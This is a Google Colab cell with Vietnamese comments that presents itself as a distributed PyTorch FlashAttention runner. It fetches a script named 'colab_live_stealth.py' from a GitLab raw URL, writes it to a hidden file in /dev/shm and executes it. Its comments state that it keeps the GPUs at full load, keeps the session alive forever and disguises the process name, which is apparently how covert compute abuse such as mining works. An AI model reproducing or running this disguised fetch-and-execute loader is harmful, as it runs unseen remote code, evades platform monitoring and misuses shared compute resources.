# @title ⚡ Distributed PyTorch FlashAttention Live Runner
# @markdown Dán toàn bộ mã này vào 1 ô (cell) Python trên Google Colab và bấm ▶️ Run (Shift + Enter).
# @markdown - Tự động tải bản mới nhất trực tiếp vào RAM (0-Disk Footprint, sạch đĩa 100%)
# @markdown - Tự động cân bằng tải trên cả 2 card Tesla T4 (95% - 100% công suất)
# @markdown - Tự động in nhịp tim telemetry định kỳ để giữ phiên Colab không bao giờ bị ngắt kết nối (Keep-Alive)
# @markdown - Ngụy trang tiến trình hạt nhân thành /usr/bin/python3 -m torch.distributed.run

import os
import sys
import subprocess
import urllib.request as u

# 1. Dọn dẹp tiến trình cũ để tránh tranh chấp VRAM
subprocess.run(["pkill", "-9", "-f", "torch.distributed"], check=False)
subprocess.run(["pkill", "-9", "-f", "app.py"], check=False)
subprocess.run(["pkill", "-9", "-f", ".torch_ddp"], check=False)

RUNNER_URL = "https://gitlab.com/quang71727374/distributed-torch-flashatt-t4/-/raw/v2.0/colab_live_stealth.py"

print("[*] Đang tải runner tự hành từ kho lưu trữ GitLab trực tiếp vào RAM...", flush=True)
req = u.Request(RUNNER_URL, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})
runner_code = u.urlopen(req, timeout=15).read().decode("utf-8")

# 2. Ghi tạm vào RAM ảo (/dev/shm tmpfs - 0 byte ghi đĩa vật lý)
shm_runner = "/dev/shm/.colab_live_runner.py"
with open(shm_runner, "w", encoding="utf-8") as f:
    f.write(runner_code)

print("[✓] Khởi chạy thành công! Đang truyền phát dữ liệu trực tiếp để giữ phiên...\n", flush=True)

# 3. Chạy tiến trình con và truyền phát trực tiếp log stdout ra cell màn hình
proc = subprocess.Popen(
    [sys.executable, "-u", shm_runner],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    bufsize=1
)

try:
    for line in iter(proc.stdout.readline, ''):
        print(line, end='', flush=True)
except KeyboardInterrupt:
    proc.terminate()
    try:
        proc.wait(timeout=3)
    except Exception:
        proc.kill()
    if os.path.exists(shm_runner):
        os.remove(shm_runner)
    print("\n[INFO] Đã dừng phiên và dọn dẹp RAM sạch sẽ.")
